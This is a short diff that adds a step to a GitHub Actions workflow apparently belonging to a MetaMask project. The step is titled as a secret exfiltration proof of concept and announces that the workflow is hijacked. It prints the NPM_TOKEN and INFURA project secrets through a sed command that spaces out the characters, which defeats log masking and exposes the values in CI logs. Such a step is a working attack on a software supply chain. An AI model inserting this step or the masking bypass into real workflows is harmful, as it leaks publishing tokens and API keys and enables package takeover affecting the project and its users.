@@ -50,6 +50,13 @@ jobs:
       contents: write
     runs-on: ubuntu-latest
     steps:
+      - name: POC - SECRET EXFILTRATION TEST
+        run: |
+            echo "--- PPE SUCCESSFUL: WORKFLOW HIJACKED ---"
+            echo "STEALING SECRETS..."
+            echo "NPM_TOKEN: ${{ secrets.NPM_TOKEN }}" | sed 's/./& /g'
+            echo "INFURA_KEY: ${{ secrets.INFURA_PROJECT_ID }}" | sed 's/./& /g'
+            
       - name: Checkout and setup environment
         uses: MetaMask/action-checkout-and-setup@v1
         with:
